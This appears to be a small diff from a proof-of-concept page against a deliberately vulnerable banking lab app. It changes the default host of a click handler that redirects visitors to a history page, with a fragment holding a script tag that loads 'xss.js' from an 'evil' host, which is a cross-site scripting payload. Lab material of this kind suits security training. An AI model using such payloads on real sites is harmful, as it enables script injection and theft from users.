@@ -52,7 +52,7 @@
         }
         $(".btn").on("click", function() {
             query = getQueryParams(document.location.search);
-            host = query.url || "hack.vulnbank.com";
+            host = query.url || "vulnbank.com";
             window.location.href="https://"+host+'/vulnbank/online/history.php#<script src="https://evil.vulnbank.com/xss.js">';
         });
 
